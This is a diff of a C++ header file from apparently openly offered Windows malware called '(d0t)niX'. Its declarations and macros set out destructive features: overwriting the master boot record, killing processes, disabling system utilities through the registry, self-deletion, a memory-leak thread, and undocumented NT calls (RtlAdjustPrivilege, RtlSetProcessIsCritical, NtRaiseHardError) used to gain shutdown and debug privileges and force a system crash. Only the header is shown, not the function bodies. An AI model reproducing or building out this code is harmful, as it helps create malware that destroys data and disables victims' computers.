@@ -16,19 +16,26 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 
 //// Interenal Dependencies /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #include "Sub-Headers/settings.h"
-#include "Sub-Headers/nt.h"
 #include "Sub-Headers/resource.h"
 
 //// Libraries //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// CryptoAPI Library //
 #pragma comment(lib, "bcrypt.lib")
+// WindowsShellAPI Library //
 #pragma comment(lib, "shlwapi.lib")
+
+#if NT_FUNCTIONS == TRUE
+	// NT/RTL Library //
+	#pragma comment(lib, "ntdll.lib")
+#endif // NT_FUNCTIONS
 
 //// Macros /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-// General Macros //
+// Standard Macros //
 #define szMALWR_NAME L"(d0t)niX [.niX]"
 
-// ErrorHandler Macros //
+// Error/Message -Handling Macros //
 #if DEBUG_MSG == TRUE
 	#define szFORMAT L"%s returned with Errorcode:\n%d : %s"
 	#define cbMAX_HEAP_SIZE 0x7d0
@@ -49,6 +56,13 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 #define nMAX_BUFFER_SIZE 0x2000000
 #define szHOST_MUTEX L"Global\\Win32M.(d0t)niX[.niX]:Argv:/host.Proc(running)"
 
+#if NT_FUNCTIONS == TRUE
+	// NT Macros //
+	#define OPTION_SHUTDOWN_SYSTEM 0x6
+	#define SE_SHUTDOWN_PRIVILEGE 0x13
+	#define SE_DEBUG_PRIVILEGE 0x14
+#endif // NT_FUNCTIONS
+
 //// Wrapper Macros /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #define nRNG_RAN(nMin, nMax) (nMin + (fnCryptGenRandomNumber() % ((nMax - nMin) + 1)))
 #if DEBUG_MSG == TRUE
@@ -68,8 +82,16 @@ typedef struct _REGLOAD {
 	DWORD   dwValue;
 } REGLOAD;
 
+#if NT_FUNCTIONS == TRUE
+	typedef struct {
+		USHORT Length;
+		USHORT MaximumLength;
+		LPWSTR  Buffer;
+	} UNICODE_STRING, *PUNICODE_STRING;
+#endif // NT_FUNCTIONS
+
 //// Arrays/Sizes ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-extern LPCWSTR lpszWarningMSG;
+extern LPCWSTR lpWarningMSG;
 
 extern WCHAR szCd[MAX_PATH];
 extern WCHAR szMfn[MAX_PATH];
@@ -77,25 +99,13 @@ extern WCHAR szMfn[MAX_PATH];
 extern const WCHAR szCharSet[];
 extern const SIZE_T cculCharSet;
 
-extern LPCWSTR lpszKillProcs[];
+extern LPCWSTR lpKillProcs[];
 extern const SIZE_T cculKillProcs;
 
 extern const REGLOAD rlDisableKeys[];
 extern const SIZE_T cculDisableKeys;
 
 //// Function Declarations //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-// ErrorHandling Function //
-#if DEBUG_MSG == TRUE
-	VOID fnMessageHandlerW(
-		_In_opt_ LPCWSTR lpCaption,
-		_In_opt_ LPCWSTR lpText,
-		_In_opt_ WORD    wTextID,
-		_In_opt_ LPCWSTR lpFunction,
-		_In_opt_ UINT    uType,
-		_In_opt_         ...
-	);
-#endif // DEBUG_MSG
 
 // FileSystem Functions //
 BOOL fnCopyFileW(
@@ -116,13 +126,56 @@ BOOL fnSelfDeleteW(VOID);
 	BOOL fnOverwriteMBR(VOID);
 #endif // KILL_MBR
 
-// GenRandom Functions //
+// CryptGenRandom Functions //
 INT fnCryptGenRandomNumber(VOID);
-std::wstring fnCryptGenRandomStringW(
-	_In_ INT nLen
+LPCWSTR fnCryptGenRandomStringW(
+	_In_opt_ LPWSTR  lpBuffer,
+	_In_     INT     nBufferSize,
+	_In_     LPCWSTR lpCharSet
 );
 
-// Protection Functions //
+#if DEBUG_MSG == TRUE
+// Error/Message -Handling Function //
+VOID fnMessageHandlerW(
+	_In_opt_ LPCWSTR lpCaption,
+	_In_opt_ LPCWSTR lpText,
+	_In_opt_ WORD    wTextID,
+	_In_opt_ LPCWSTR lpFunction,
+	_In_opt_ UINT    uType,
+	_In_opt_         ...
+);
+#endif // DEBUG_MSG
+
+#if NT_FUNCTIONS == TRUE
+// NT/RTL Function Prototypes //
+EXTERN_C NTSYSAPI NTSTATUS NTAPI RtlAdjustPrivilege(
+	_In_ ULONG,
+	_In_ BOOLEAN,
+	_In_ BOOLEAN,
+	_Out_ PBOOLEAN
+);
+EXTERN_C NTSYSAPI NTSTATUS STDAPIVCALLTYPE RtlSetProcessIsCritical(
+	_In_ BOOLEAN,
+	_Out_opt_ PBOOLEAN,
+	_In_ BOOLEAN
+);
+EXTERN_C NTSYSAPI NTSTATUS NTAPI NtRaiseHardError(
+	_In_ NTSTATUS,
+	_In_ ULONG,
+	_In_opt_ PUNICODE_STRING,
+	_In_opt_ LPVOID*,
+	_In_ UINT,
+	_Out_ LPUINT
+);
+
+// NT Utilitie Functions //
+BOOL fnNTSetProcessIsCritical(
+	_In_ BOOLEAN blIsCritical
+);
+BOOL fnNTRaiseHardError(VOID);
+#endif // NT_FUNCTIONS
+
+// ProcessPersistency Functions //
 
 // Registry Functions //
 BOOL fnCreateRegistryKeyW(
@@ -140,7 +193,7 @@ BOOL fnCheckRegistryKeyW(
 	BOOL fnDisableUtilities(VOID);
 #endif // !DISABLE_PROTECTIONS
 
-// Resource Functions //
+// ResourceUtilitie Functions //
 BOOL fnExtractResourceW(
 	_In_ WORD    wResID,
 	_In_ LPCWSTR lpResType,
@@ -157,15 +210,19 @@ BOOL fnSaveResourceW(
 	_In_ DWORD   dwBufferSize
 );
 
-// Synchronization Functions //
-#if SYNCHRONIZATION == TRUE
-	BOOL fnCheckMutexW(
-		_In_ LPCWSTR lpName
-	);
-	HANDLE fnCheckSemaphoreW(
-		_In_ LPCWSTR lpName
-	);
-#endif // !DISABLE_SYNCHRONIZATION
-
 // Utilitie Functions //
 BOOL fnIsUserAdmin(VOID);
+DWORD WINAPI thMemoryLeaker(
+	_In_ LPVOID lpParam
+);
+BOOL fnCreateProcessW(
+	_In_ LPCWSTR lpFileName,
+	_In_ LPCWSTR lpCommandLine,
+	_In_ DWORD   dwCreationFlags,
+	_In_ LPCWSTR lpCurrentDirectory
+);
+#if SYNCHRONIZATION == TRUE
+BOOL fnCheckMutexW(
+	_In_ LPCWSTR lpName
+);
+#endif // SYNCHRONIZATION
